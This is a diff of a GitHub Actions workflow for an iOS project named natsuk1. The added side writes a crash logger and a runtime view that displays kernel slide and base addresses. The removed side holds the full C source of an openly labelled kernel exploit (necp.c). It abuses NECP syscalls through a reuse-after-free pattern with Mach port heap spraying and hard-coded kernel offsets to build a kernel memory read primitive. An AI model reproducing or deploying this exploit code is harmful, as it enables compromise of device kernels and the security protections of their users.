@@ -1,4 +1,4 @@
-name: 1 · Fix and Test
+name: 2 · Crash Log + Runtime
 
 on:
   push:
@@ -9,13 +9,16 @@ permissions:
   contents: write
 
 concurrency:
-  group: fix-test-${{ github.ref }}
+  group: crashlog-${{ github.ref }}
   cancel-in-progress: false
 
+env:
+  XCODE_VERSION: "26.5"
+
 jobs:
-  fix-and-test:
+  patch:
     runs-on: macos-26
-    timeout-minutes: 45
+    timeout-minutes: 30
     steps:
       - uses: actions/checkout@v5
         with:
@@ -23,567 +26,454 @@ jobs:
 
       - uses: maxim-lobanov/setup-xcode@v1
         with:
-          xcode-version: "26.5"
+          xcode-version: ${{ env.XCODE_VERSION }}
 
-      - name: Remove competing workflow
+      - name: Write CrashLog.swift
         run: |
-          rm -f .github/workflows/natsuk1.yml
-          rm -f .github/workflows/main.yml
+          cat > natsuk1/Helpers/CrashLog.swift <<'SWIFT'
+          import Foundation
+          import UIKit
 
-      - name: Patch nk_api.c
+          /// Persistent crash-safe logger.
+          ///  - Writes every line to Documents/natsuk1-live.log (survives crash)
+          ///  - Installs NSException + BSD signal handlers
+          ///  - On next launch recoverPreviousSession() returns the previous session
+          ///    text if the last line was not [SHUTDOWN]
+          final class CrashLog: @unchecked Sendable {
+              nonisolated(unsafe) static let shared = CrashLog()
+
+              private let queue = DispatchQueue(label: "natsuk1.crashlog")
+              private var handle: FileHandle?
+              private var currentSize: Int = 0
+              private let maxBytes: Int = 1024 * 1024
+              private var installed = false
+              private let shutdownMarker = "[SHUTDOWN]"
+
+              private var docsDir: URL {
+                  FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
+              }
+              private var liveURL: URL { docsDir.appendingPathComponent("natsuk1-live.log") }
+              private var crashURL: URL { docsDir.appendingPathComponent("natsuk1-crash.log") }
+
+              private init() {}
+
+              func install() {
+                  queue.sync {
+                      guard !installed else { return }
+                      installed = true
+                      _detectPrevCrash()
+                      _open()
+                      _installHandlers()
+                  }
+              }
+
+              private func _detectPrevCrash() {
+                  let fm = FileManager.default
+                  guard fm.fileExists(atPath: liveURL.path) else { return }
+                  let data = (try? Data(contentsOf: liveURL)) ?? Data()
+                  guard !data.isEmpty else { return }
+                  let s = String(data: data, encoding: .utf8) ?? ""
+                  let tail = s.split(separator: "\n").suffix(3).joined(separator: "\n")
+                  if !tail.contains(shutdownMarker) {
+                      try? fm.removeItem(at: crashURL)
+                      try? fm.copyItem(at: liveURL, to: crashURL)
+                  }
+              }
+
+              private func _open() {
+                  let fm = FileManager.default
+                  try? fm.removeItem(at: liveURL)
+                  fm.createFile(atPath: liveURL.path, contents: nil)
+                  handle = try? FileHandle(forWritingTo: liveURL)
+                  currentSize = 0
+                  let stamp = ISO8601DateFormatter().string(from: Date())
+                  _write("[BOOT] \(stamp)\n")
+              }
+
+              private func _installHandlers() {
+                  NSSetUncaughtExceptionHandler { ex in
+                      let head = "[FATAL] NSException \(ex.name.rawValue): \(ex.reason ?? "")\n"
+                      let stk = ex.callStackSymbols.joined(separator: "\n") + "\n"
+                      CrashLog.shared._write(head + stk)
+                      CrashLog.shared._flush()
+                  }
+                  for sig in [SIGSEGV, SIGABRT, SIGBUS, SIGILL, SIGTRAP, SIGFPE] {
+                      signal(sig, { s in
+                          CrashLog.shared._write("[FATAL] signal \(s)\n")
+                          CrashLog.shared._flush()
+                          signal(s, SIG_DFL)
+                          raise(s)
+                      })
+                  }
+              }
+
+              func writeLine(_ s: String) {
+                  queue.async { [weak self] in
+                      self?._write(s + "\n")
+                  }
+              }
+
+              /// Mark the current session as cleanly finished.
+              /// Called when scenePhase goes to .background so that
+              /// next launch will NOT be treated as a crash.
+              func markCleanShutdown() {
+                  queue.async { [weak self] in
+                      guard let self else { return }
+                      if self.handle == nil { return }
+                      self._write(self.shutdownMarker + "\n")
+                      self._flush()
+                  }
+              }
+
+              private func _write(_ s: String) {
+                  NSLog("%@", s.trimmingCharacters(in: .newlines))
+                  guard let h = handle, let d = s.data(using: .utf8) else { return }
+                  _ = try? h.write(contentsOf: d)
+                  currentSize += d.count
+                  if currentSize > maxBytes { _rotate() }
+              }
+
+              private func _rotate() {
+                  _ = try? handle?.close()
+                  handle = nil
+                  let fm = FileManager.default
+                  try? fm.removeItem(at: liveURL)
+                  fm.createFile(atPath: liveURL.path, contents: nil)
+                  handle = try? FileHandle(forWritingTo: liveURL)
+                  currentSize = 0
+                  _write("[ROTATE]\n")
+              }
+
+              private func _flush() {
+                  try? handle?.synchronize()
+              }
+
+              func recoverPreviousSession() -> String? {
+                  let fm = FileManager.default
+                  guard fm.fileExists(atPath: crashURL.path) else { return nil }
+                  guard let data = try? Data(contentsOf: crashURL) else { return nil }
+                  return String(data: data, encoding: .utf8)
+              }
+
+              func clearPreviousCrash() {
+                  try? FileManager.default.removeItem(at: crashURL)
+              }
+          }
+          SWIFT
+
+      - name: Write RuntimeView.swift
+        run: |
+          cat > natsuk1/Views/RuntimeView.swift <<'SWIFT'
+          import SwiftUI
+          import UIKit
+
+          struct RuntimeView: View {
+              @EnvironmentObject var state: AppState
+
+              private var osShort: String {
+                  let v = ProcessInfo.processInfo.operatingSystemVersion
+                  return "\(v.majorVersion).\(v.minorVersion)"
+              }
+              private var deviceLine: String {
+                  "\(DeviceName.friendly()) · iOS \(osShort)"
+              }
+
+              var body: some View {
+                  Section {
+                      row("Slide", state.slide, hot: state.slide != "—")
+                      row("Base",  state.base,  hot: state.base  != "—")
+                      HStack {
+                          Text("Status")
+                          Spacer()
+                          StatusDot(status: state.status)
+                      }
+                      HStack {
+                          Text("Device")
+                          Spacer()
+                          Text(deviceLine)
+                              .font(.system(size: 12, design: .monospaced))
+                              .foregroundStyle(.secondary)
+                              .lineLimit(1)
+                              .truncationMode(.middle)
+                      }
+                  } header: {
+                      Label("Runtime", systemImage: "waveform.path.ecg")
+                  } footer: {
+                      Group {
+                          if let crash = state.previousCrash, !crash.isEmpty {
+                              Button {
+                                  state.showCrashLog = true
+                              } label: {
+                                  HStack(spacing: 6) {
+                                      Image(systemName: "exclamationmark.triangle.fill")
+                                          .foregroundStyle(.orange)
+                                      Text("Previous session crashed — tap to view")
+                                          .font(.footnote)
+                                      Spacer()
+                                      Image(systemName: "chevron.right")
+                                          .font(.caption)
+                                          .foregroundStyle(.tertiary)
+                                  }
+                              }
+                          }
+                      }
+                  }
+              }
+
+              private func row(_ k: String, _ v: String, hot: Bool) -> some View {
+                  HStack {
+                      Text(k)
+                      Spacer()
+                      Text(v)
+                          .font(.system(size: 13, design: .monospaced))
+                          .foregroundStyle(hot ? Color.green : Color.secondary)
+                          .lineLimit(1)
+                          .truncationMode(.middle)
+                  }
+              }
+          }
+          SWIFT
+
+      - name: Write CrashLogView.swift
+        run: |
+          cat > natsuk1/Views/CrashLogView.swift <<'SWIFT'
+          import SwiftUI
+          import UIKit
+
+          struct CrashLogView: View {
+              @EnvironmentObject var state: AppState
+              @Environment(\.dismiss) private var dismiss
+              @State private var copied = false
+
+              var body: some View {
+                  NavigationStack {
+                      ScrollView {
+                          Text(state.previousCrash ?? "(empty)")
+                              .font(.system(size: 11, design: .monospaced))
+                              .frame(maxWidth: .infinity, alignment: .leading)
+                              .padding()
+                              .textSelection(.enabled)
+                      }
+                      .navigationTitle("Previous crash")
+                      .navigationBarTitleDisplayMode(.inline)
+                      .toolbar {
+                          ToolbarItem(placement: .navigationBarLeading) {
+                              Button("Done") { dismiss() }
+                          }
+                          ToolbarItem(placement: .navigationBarTrailing) {
+                              Button {
+                                  UIPasteboard.general.string = state.previousCrash ?? ""
+                                  copied = true
+                                  DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
+                                      copied = false
+                                  }
+                              } label: {
+                                  Image(systemName: copied ? "checkmark" : "doc.on.doc")
+                              }
+                          }
+                      }
+                  }
+              }
+          }
+          SWIFT
+
+      - name: Patch natsuk1.swift
         run: |
           set -euo pipefail
           python3 - <<'PYEOF'
-          F = "natsuk1/Exploit/nk_api.c"
-          with open(F) as f:
+          import sys
+
+          P = "natsuk1/natsuk1.swift"
+          with open(P) as f:
               s = f.read()
-          if "natsuk1-v8-api" in s:
+
+          if "natsuk1-crashlog-v1" in s:
               print("already patched")
-              raise SystemExit(0)
+              sys.exit(0)
+
           orig = s
-          old = "int nk_full_exploit(void) { return nk_run(); }"
-          new = ("/* natsuk1-v8-api */\n"
-                 "int nk_full_exploit(void) { return nk_necp_run(); }")
-          if old not in s:
-              print("ERROR: nk_full_exploit body not found")
-              raise SystemExit(1)
-          s = s.replace(old, new)
+
+          # 1. cCallback: mirror to CrashLog + parse slide/base
+          old_cb = 'LockedBuffer.shared.append(String(decoding: bytes, as: UTF8.self))'
+          new_cb = ('let _line = String(decoding: bytes, as: UTF8.self)\n'
+                    '    LockedBuffer.shared.append(_line)\n'
+                    '    CrashLog.shared.writeLine(_line)\n'
+                    '    AppState.shared.parseLogLine(_line) /* natsuk1-crashlog-v1 */')
+          if old_cb not in s:
+              print("ERROR: cCallback marker not found")
+              sys.exit(1)
+          s = s.replace(old_cb, new_cb, 1)
+
+          # 2. AppState: add @Published + parseLogLine
+          state_marker = 'final class AppState: ObservableObject, @unchecked Sendable {'
+          if state_marker not in s:
+              print("ERROR: AppState marker not found")
+              sys.exit(1)
+
+          add_fields = '''
+
+              @Published var slide: String = "—"
+              @Published var base: String = "—"
+              @Published var previousCrash: String? = nil
+              @Published var showCrashLog: Bool = false
+
+              func parseLogLine(_ line: String) {
+                  if let v = Self.extractHex(line, keys: ["slide=0x", "SLIDE = 0x", "slide = 0x"]) {
+                      if self.slide != v {
+                          DispatchQueue.main.async { self.slide = v }
+                      }
+                  }
+                  if let v = Self.extractHex(line, keys: ["base=0x", "BASE = 0x", "base = 0x"]) {
+                      if self.base != v {
+                          DispatchQueue.main.async { self.base = v }
+                      }
+                  }
+              }
+
+              private static func extractHex(_ s: String, keys: [String]) -> String? {
+                  for k in keys {
+                      if let r = s.range(of: k) {
+                          var hex = ""
+                          for c in s[r.upperBound...] {
+                              if c.isHexDigit { hex.append(c) } else { break }
+                          }
+                          if !hex.isEmpty { return "0x" + hex }
+                      }
+                  }
+                  return nil
+              }
+          '''
+          s = s.replace(state_marker, state_marker + add_fields, 1)
+
+          # 3. onAppear: install CrashLog + recover
+          hook = '.onAppear {\n                        nk_set_log(cCallback)'
+          if hook not in s:
+              print("ERROR: onAppear hook not found")
+              sys.exit(1)
+          new_hook = ('.onAppear {\n'
+                      '                        CrashLog.shared.install()\n'
+                      '                        if let prev = CrashLog.shared.recoverPreviousSession(),\n'
+                      '                           !prev.isEmpty {\n'
+                      '                            AppState.shared.previousCrash = prev\n'
+                      '                        }\n'
+                      '                        nk_set_log(cCallback)')
+          s = s.replace(hook, new_hook, 1)
+
+          # 4. .sheet for CrashLogView — attach right after .overlay {}
+          overlay_old = ('.overlay {\n'
+                         '                        if state.show_respring {\n'
+                         '                            RespringView().brightness(-1.0).ignoresSafeArea()\n'
+                         '                        }\n'
+                         '                    }')
+          overlay_new = overlay_old + ('\n'
+                         '                    .sheet(isPresented: $state.showCrashLog) {\n'
+                         '                        CrashLogView().environmentObject(state)\n'
+                         '                    }\n'
+                         '                    .onChange(of: scenePhase) { _, phase in\n'
+                         '                        if phase == .background {\n'
+                         '                            CrashLog.shared.markCleanShutdown()\n'
+                         '                        }\n'
+                         '                    }')
+          if overlay_old not in s:
+              print("ERROR: overlay marker not found")
+              sys.exit(1)
+          s = s.replace(overlay_old, overlay_new, 1)
+
+          # 5. scenePhase env
+          phase_marker = '@Environment(\\.scenePhase) private var scenePhase'
+          if phase_marker not in s:
+              # Inject into RootView
+              root_marker = 'struct RootView: View {'
+              if root_marker not in s:
+                  print("ERROR: RootView marker not found")
+                  sys.exit(1)
+              s = s.replace(root_marker,
+                            root_marker + '\n    @Environment(\\.scenePhase) private var scenePhase',
+                            1)
+
           if s == orig:
-              raise SystemExit("ERROR: no changes")
-          if "natsuk1-v8-api" not in s:
-              raise SystemExit("ERROR: marker missing")
-          if s.count("int nk_full_exploit(void)") != 1:
-              raise SystemExit("ERROR: nk_full_exploit count != 1")
-          with open(F, "w") as f:
+              print("ERROR: no changes to natsuk1.swift")
+              sys.exit(1)
+          if "natsuk1-crashlog-v1" not in s:
+              print("ERROR: marker missing")
+              sys.exit(1)
+
+          for want in [
+              "CrashLog.shared.install()",
+              "CrashLog.shared.recoverPreviousSession()",
+              "CrashLog.shared.writeLine(_line)",
+              "CrashLog.shared.markCleanShutdown()",
+              "parseLogLine(_line)",
+              "previousCrash: String?",
+              "showCrashLog: Bool",
+              "private var scenePhase",
+          ]:
+              if want not in s:
+                  print("ERROR: missing %s" % want)
+                  sys.exit(1)
+
+          with open(P, "w") as f:
               f.write(s)
-          print("nk_api.c patched")
+          print("natsuk1.swift patched")
           PYEOF
 
-      - name: Write necp.c
+      - name: Patch OverviewView.swift
         run: |
           set -euo pipefail
           python3 - <<'PYEOF'
-          lines = [
-          '#include <stdio.h>',
-          '#include <stdlib.h>',
-          '#include <string.h>',
-          '#include <stdint.h>',
-          '#include <stdbool.h>',
-          '#include <stdarg.h>',
-          '#include <unistd.h>',
-          '#include <errno.h>',
-          '#include <pthread.h>',
-          '#include <sys/syscall.h>',
-          '#include <mach/mach.h>',
-          '#include <mach/vm_map.h>',
-          '#include <mach/vm_region.h>',
-          '#include <mach/message.h>',
-          '',
-          '#include "nk_api.h"',
-          '',
-          '#ifndef SYS_NECP_OPEN',
-          '#define SYS_NECP_OPEN 501',
-          '#endif',
-          '#ifndef SYS_NECP_ACTION',
-          '#define SYS_NECP_ACTION 502',
-          '#endif',
-          '',
-          '#define KBASE 0xFFFFFFF007004000ULL',
-          '#define OFF_KERNPROC 0xBBB040ULL',
-          '#define OFF_TASK_LIST 0x10D53F0ULL',
-          '#define KPTR_MIN 0xFFFFFFF000000000ULL',
-          '#define KPTR_MAX 0xFFFFFFFFFF000000ULL',
-          '',
-          '#define NECP_ADD_CLIENT 0x01',
-          '#define NECP_COPY_RESULT 0x04',
-          '#define NECP_ADD_FLOW 0x11',
-          '#define NECP_REMOVE_FLOW 0x12',
-          '#define GATE_BYTE 9',
-          '',
-          '#define NCF_SZ 0x400',
-          '#define NCF_ASN 0x68',
-          '#define NCF_LEN 0x70',
-          '#define NCF_PAR 0x88',
-          '#define NCF_REF 0x58',
-          '',
-          '#define FUZZ_MAX 0x200',
-          '#define FUZZ_STEP 0x08',
-          '#define RESBUF 8192',
-          '#define NPORTS 256',
-          '#define PERPORT 5',
-          '',
-          'static uint64_t g_kbase;',
-          'static uint64_t g_slide;',
-          'static int g_res_off = -1;',
-          'static uint8_t g_res_buf[RESBUF];',
-          '',
-          'typedef struct {',
-          '    mach_msg_header_t hdr;',
-          '    mach_msg_body_t body;',
-          '    mach_msg_ool_descriptor_t ool;',
-          '} ool_t;',
-          '',
-          'static void lg(const char *tag, const char *sign, const char *fmt, ...) {',
-          '    char body[448];',
-          '    va_list ap;',
-          '    va_start(ap, fmt);',
-          '    vsnprintf(body, sizeof(body), fmt, ap);',
-          '    va_end(ap);',
-          '    char out[512];',
-          '    snprintf(out, sizeof(out), "%s%s", sign, body);',
-          '    nk_logx(tag, "%s", out);',
-          '}',
-          '#define LI(t, ...) lg(t, "", __VA_ARGS__)',
-          '#define LO(t, ...) lg(t, "+ ", __VA_ARGS__)',
-          '#define LE(t, ...) lg(t, "- ", __VA_ARGS__)',
-          '#define LW(t, ...) lg(t, "! ", __VA_ARGS__)',
-          '',
-          'static void dumpw(const char *tag, const uint8_t *p, int n) {',
-          '    char line[1024];',
-          '    int off = 0;',
-          '    if (n > 24) n = 24;',
-          '    for (int i = 0; i < n; i++) {',
-          '        uint64_t w;',
-          '        memcpy(&w, p + i * 8, 8);',
-          '        off += snprintf(line + off, sizeof(line) - off,',
-          '                        "%02d:%016llx ", i, (unsigned long long)w);',
-          '        if (off > 900) break;',
-          '    }',
-          '    LI(tag, "%s", line);',
-          '}',
-          '',
-          'static volatile int g_qw = 0;',
-          '',
-          'static mach_port_t port_new(void) {',
-          '    mach_port_t p = MACH_PORT_NULL;',
-          '    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p)',
-          '        != KERN_SUCCESS) return MACH_PORT_NULL;',
-          '    mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);',
-          '    mach_port_limits_t lim;',
-          '    lim.mpl_qlimit = 4096;',
-          '    kern_return_t kr = mach_port_set_attributes(mach_task_self(), p,',
-          '                                                 MACH_PORT_LIMITS_INFO,',
-          '                                                 (mach_port_info_t)&lim,',
-          '                                                 MACH_PORT_LIMITS_INFO_COUNT);',
-          '    if (kr != KERN_SUCCESS && !g_qw) {',
-          '        g_qw = 1;',
-          '        LW("PORT", "set_qlimit kr=%d", kr);',
-          '    }',
-          '    return p;',
-          '}',
-          '',
-          'typedef struct {',
-          '    mach_port_t ports[NPORTS];',
-          '    int n;',
-          '} spray_t;',
-          '',
-          'static void spray_init(spray_t *sp, int want) {',
-          '    sp->n = 0;',
-          '    if (want > NPORTS) want = NPORTS;',
-          '    for (int i = 0; i < want; i++) {',
-          '        mach_port_t p = port_new();',
-          '        if (p == MACH_PORT_NULL) break;',
-          '        sp->ports[sp->n++] = p;',
-          '    }',
-          '}',
-          '',
-          'static int spray_send(spray_t *sp, const void *d, size_t sz) {',
-          '    ool_t m;',
-          '    int sent = 0;',
-          '    for (int i = 0; i < sp->n; i++) {',
-          '        for (int j = 0; j < PERPORT; j++) {',
-          '            memset(&m, 0, sizeof(m));',
-          '            m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)',
-          '                             | MACH_MSGH_BITS_COMPLEX;',
-          '            m.hdr.msgh_size = sizeof(m);',
-          '            m.hdr.msgh_remote_port = sp->ports[i];',
-          '            m.hdr.msgh_id = 0x5500 + sent;',
-          '            m.body.msgh_descriptor_count = 1;',
-          '            m.ool.address = (void*)d;',
-          '            m.ool.size = (mach_msg_size_t)sz;',
-          '            m.ool.copy = MACH_MSG_VIRTUAL_COPY;',
-          '            m.ool.deallocate = FALSE;',
-          '            m.ool.type = MACH_MSG_OOL_DESCRIPTOR;',
-          '            if (mach_msg(&m.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,',
-          '                         sizeof(m), 0, MACH_PORT_NULL, 50,',
-          '                         MACH_PORT_NULL) == MACH_MSG_SUCCESS) {',
-          '                sent++;',
-          '            } else break;',
-          '        }',
-          '    }',
-          '    return sent;',
-          '}',
-          '',
-          'static void spray_drain(spray_t *sp) {',
-          '    uint8_t buf[2048];',
-          '    mach_msg_header_t *h = (mach_msg_header_t*)buf;',
-          '    for (int i = 0; i < sp->n; i++) {',
-          '        for (int j = 0; j < PERPORT + 4; j++) {',
-          '            h->msgh_size = sizeof(buf);',
-          '            if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,',
-          '                         0, sizeof(buf), sp->ports[i], 1,',
-          '                         MACH_PORT_NULL) != KERN_SUCCESS) break;',
-          '        }',
-          '        mach_port_destroy(mach_task_self(), sp->ports[i]);',
-          '    }',
-          '    sp->n = 0;',
-          '}',
-          '',
-          'static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }',
-          '',
-          'static int nadd_client(int fd, uint8_t uuid[16]) {',
-          '    uint8_t p[1] = {0};',
-          '    return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,',
-          '                        uuid, (size_t)16, p, (size_t)1);',
-          '}',
-          '',
-          'static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {',
-          '    uint8_t req[56];',
-          '    memset(req, 0, sizeof(req));',
-          '    memcpy(req + 0x10, cu, 16);',
-          '    *(uint16_t*)(req + 0x20) = 0x0040;',
-          '    int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,',
-          '                         (void*)cu, (size_t)16, req, (size_t)56);',
-          '    if (r == 0) {',
-          '        memcpy(fu, req, 16);',
-          '        fu[GATE_BYTE] |= 0x01;',
-          '    }',
-          '    return r;',
-          '}',
-          '',
-          'static int nrm_flow(int fd, const uint8_t fu[16]) {',
-          '    return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,',
-          '                        (void*)fu, (size_t)16, NULL, (size_t)0);',
-          '}',
-          '',
-          'static int ncpy(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {',
-          '    return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,',
-          '                        (void*)cu, (size_t)16, b, (uint32_t)bl);',
-          '}',
-          '',
-          'static int trial(uint64_t tgt, uint32_t rd, int aoff, int loff, int poff,',
-          '                 uint8_t fill, uint8_t *out, int outsz) {',
-          '    uint8_t fake[NCF_SZ];',
-          '    memset(fake, fill, sizeof(fake));',
-          '    if (aoff >= 0 && aoff + 8 <= NCF_SZ) *(uint64_t*)(fake + aoff) = tgt;',
-          '    if (loff >= 0 && loff + 8 <= NCF_SZ) *(uint64_t*)(fake + loff) = rd;',
-          '    if (poff >= 0 && poff + 8 <= NCF_SZ) *(uint64_t*)(fake + poff) = 0;',
-          '    uint8_t junk[NCF_SZ];',
-          '    memset(junk, 0x41, sizeof(junk));',
-          '    spray_t ex;',
-          '    spray_init(&ex, NPORTS);',
-          '    spray_send(&ex, junk, NCF_SZ);',
-          '    int fd = nfd();',
-          '    if (fd < 0) { spray_drain(&ex); return -1; }',
-          '    uint8_t cu[16], fu[16];',
-          '    if (nadd_client(fd, cu) != 0 || nadd_flow(fd, cu, fu) != 0) {',
-          '        close(fd); spray_drain(&ex); return -2;',
-          '    }',
-          '    nrm_flow(fd, fu);',
-          '    spray_drain(&ex);',
-          '    usleep(200);',
-          '    spray_t sp;',
-          '    spray_init(&sp, NPORTS);',
-          '    spray_send(&sp, fake, NCF_SZ);',
-          '    usleep(150);',
-          '    memset(out, 0, outsz);',
-          '    int ret = ncpy(fd, cu, out, outsz);',
-          '    spray_drain(&sp);',
-          '    close(fd);',
-          '    return ret;',
-          '}',
-          '',
-          'static int fuzz(void) {',
-          '    const uint64_t tgt = 0xFFFFFFF00ADEE310ULL;',
-          '    uint8_t buf[RESBUF];',
-          '    uint8_t base[RESBUF];',
-          '    int br = trial(0, 0, -1, -1, NCF_PAR, 0x42, base, sizeof(base));',
-          '    LI("FUZZ", "baseline ret=%d", br);',
-          '    if (br > 0) {',
-          '        int nb = br / 8;',
-          '        dumpw("BASE", base, nb > 16 ? 16 : nb);',
-          '    }',
-          '    int hit = -1;',
-          '    for (int off = 0; off <= FUZZ_MAX; off += FUZZ_STEP) {',
-          '        int r = trial(tgt, 8, off, off + 8, NCF_PAR, 0x42,',
-          '                      buf, sizeof(buf));',
-          '        if (r <= 0) {',
-          '            LI("FUZZ", "off=0x%03x ret=%d", off, r);',
-          '            usleep(100);',
-          '            continue;',
-          '        }',
-          '        int cmplen = r < br ? r : br;',
-          '        int same = (r == br) && (memcmp(buf, base, cmplen) == 0);',
-          '        int has_k = 0;',
-          '        int k_off = -1;',
-          '        int has_t = 0;',
-          '        for (int i = 0; i + 8 <= r; i++) {',
-          '            uint64_t val;',
-          '            memcpy(&val, buf + i, 8);',
-          '            if (val >= KPTR_MIN && val <= KPTR_MAX) {',
-          '                has_k = 1;',
-          '                k_off = i;',
-          '            }',
-          '            if (val == tgt) has_t = 1;',
-          '        }',
-          '        LI("FUZZ", "off=0x%03x ret=%d same=%d kptr=%d@%d target=%d",',
-          '           off, r, same, has_k, k_off, has_t);',
-          '        if (has_t) {',
-          '            hit = off;',
-          '            LO("FUZZ", "HIT off=0x%x", off);',
-          '            int nb = r / 8;',
-          '            dumpw("HIT", buf, nb > 16 ? 16 : nb);',
-          '            break;',
-          '        }',
-          '        usleep(80);',
-          '    }',
-          '    return hit;',
-          '}',
-          '',
-          'static int calibrate(void) {',
-          '    if (g_res_off >= 0) return 0;',
-          '    int off = fuzz();',
-          '    if (off < 0) {',
-          '        LW("CAL", "fuzz no hit, fallback 0x%x", NCF_ASN);',
-          '        off = NCF_ASN;',
-          '    }',
-          '    const uint64_t expect = 0xFFFFFFF00ADEE310ULL;',
-          '    uint8_t b[RESBUF];',
-          '    for (int a = 0; a < 4; a++) {',
-          '        int r = trial(g_kbase + OFF_KERNPROC, 8, off, off + 8,',
-          '                      NCF_PAR, 0x42, b, sizeof(b));',
-          '        if (r > 0) {',
-          '            for (int i = 0; i + 8 <= r; i++) {',
-          '                uint64_t val;',
-          '                memcpy(&val, b + i, 8);',
-          '                if (val >= KPTR_MIN && val <= KPTR_MAX) {',
-          '                    g_res_off = i;',
-          '                    LO("CAL", "aoff=0x%x roff=0x%x val=0x%llx %s",',
-          '                       off, i, (unsigned long long)val,',
-          '                       val == expect ? "MATCH" : "kptr");',
-          '                    return 0;',
-          '                }',
-          '            }',
-          '        }',
-          '        usleep(300);',
-          '    }',
-          '    return -1;',
-          '}',
-          '',
-          'static uint64_t kr64(uint64_t addr) {',
-          '    if (g_res_off < 0 && addr != g_kbase + OFF_KERNPROC) {',
-          '        if (calibrate() != 0) return 0;',
-          '    }',
-          '    uint8_t b[RESBUF];',
-          '    int r = trial(addr, 8, NCF_ASN, NCF_LEN, NCF_PAR, 0x42,',
-          '                  b, sizeof(b));',
-          '    if (r <= 0) return 0;',
-          '    int off = g_res_off >= 0 ? g_res_off : 0;',
-          '    if (off + 8 > r) return 0;',
-          '    uint64_t val;',
-          '    memcpy(&val, b + off, 8);',
-          '    return val;',
-          '}',
-          '',
-          'static uint32_t kr32(uint64_t addr) {',
-          '    return (uint32_t)(kr64(addr) & 0xFFFFFFFF);',
-          '}',
-          '',
-          'static int sanity(void) {',
-          '    uint64_t kp = kr64(g_kbase + OFF_KERNPROC);',
-          '    uint64_t tl = kr64(g_kbase + OFF_TASK_LIST);',
-          '    LI("SAN", "kernproc=0x%llx task_list=0x%llx",',
-          '       (unsigned long long)kp, (unsigned long long)tl);',
-          '    int ok = 0;',
-          '    if (kp >= KPTR_MIN && kp <= KPTR_MAX) ok++;',
-          '    if (tl >= KPTR_MIN && tl <= KPTR_MAX) ok++;',
-          '    return ok == 2 ? 0 : -1;',
-          '}',
-          '',
-          'static int task_sanity(void) {',
-          '    uint64_t kp = kr64(g_kbase + OFF_KERNPROC);',
-          '    if (!kp || kp < KPTR_MIN || kp > KPTR_MAX) return -1;',
-          '    uint32_t pid = kr32(kp + 0x74);',
-          '    LI("TASK", "kernproc pid=%u", pid);',
-          '    return pid == 0 ? 0 : -1;',
-          '}',
-          '',
-          'static volatile int g_busy = 0;',
-          '',
-          'static int impl(void) {',
-          '    nk_log("");',
-          '    nk_log("=== natsuk1 v1.8 (natsuk1-kread-v8-fuzz) ===");',
-          '    nk_log("target: iOS 27.0 / XNU / arm64e");',
-          '    nk_log("");',
-          '    LI("INIT", "NCF_SZ=0x%x PORTS=%d PER=%d FUZZ=0..0x%x STEP=0x%x",',
-          '       NCF_SZ, NPORTS, PERPORT, FUZZ_MAX, FUZZ_STEP);',
-          '    g_slide = 0x3D00000ULL;',
-          '    g_kbase = KBASE + g_slide;',
-          '    LO("P1", "kbase=0x%llx", (unsigned long long)g_kbase);',
-          '    {',
-          '        int fd = nfd();',
-          '        if (fd < 0) {',
-          '            LE("P2", "necp_open errno=%d", errno);',
-          '            return 1;',
-          '        }',
-          '        close(fd);',
-          '        LO("P2", "necp OK");',
-          '    }',
-          '    LI("P3", "calibrate");',
-          '    if (calibrate() != 0) {',
-          '        LE("P3", "failed");',
-          '        return 1;',
-          '    }',
-          '    LO("P3", "kread ready roff=0x%x", g_res_off);',
-          '    if (sanity() != 0) {',
-          '        LE("P4", "sanity failed");',
-          '        return 1;',
-          '    }',
-          '    if (task_sanity() != 0) LW("P5", "task chain broken");',
-          '    LO("DONE", "kread complete");',
-          '    return 0;',
-          '}',
-          '',
-          'int nk_necp_run(void) {',
-          '    if (__sync_lock_test_and_set(&g_busy, 1)) {',
-          '        nk_log("[!] already running");',
-          '        return 1;',
-          '    }',
-          '    int rc = impl();',
-          '    __sync_lock_release(&g_busy);',
-          '    return rc;',
-          '}',
-          ]
-          with open("natsuk1/Exploit/necp.c", "w") as f:
-              for l in lines:
-                  f.write(l + "\n")
-          print("wrote %d lines" % len(lines))
+          import sys
+
+          P = "natsuk1/Views/OverviewView.swift"
+          with open(P) as f:
+              s = f.read()
+
+          if "natsuk1-crashlog-v1" in s:
+              print("already patched")
+              sys.exit(0)
+
+          orig = s
+          lm = s.find("List {")
+          if lm < 0:
+              print("ERROR: List { not found in OverviewView")
+              sys.exit(1)
+          ins = lm + len("List {") + 1
+          insert = ('\n                RuntimeView()'
+                    ' /* natsuk1-crashlog-v1 */'
+                    '\n                    .environmentObject(state)\n')
+          s = s[:ins] + insert + s[ins:]
+
+          if s == orig:
+              print("ERROR: no changes to OverviewView.swift")
+              sys.exit(1)
+          if s.count("natsuk1-crashlog-v1") != 1:
+              print("ERROR: marker count != 1")
+              sys.exit(1)
+          if "RuntimeView()" not in s:
+              print("ERROR: RuntimeView not inserted")
+              sys.exit(1)
+
+          with open(P, "w") as f:
+              f.write(s)
+          print("OverviewView.swift patched")
           PYEOF
 
       - name: Verify
         run: |
           set -euo pipefail
-          F=natsuk1/Exploit/necp.c
-          wc -l "$F"
-          test "$(grep -c 'nk_necp_run(void)' "$F")" = "1"
-          test "$(grep -c 'static int impl(void)' "$F")" = "1"
-          test "$(grep -c 'static int trial(uint64_t' "$F")" = "1"
-          test "$(grep -c 'static int fuzz(void)' "$F")" = "1"
-          test "$(grep -c 'static int calibrate(void)' "$F")" = "1"
-          test "$(grep -c 'static uint64_t kr64' "$F")" = "1"
-          test "$(grep -c 'static void dumpw' "$F")" = "1"
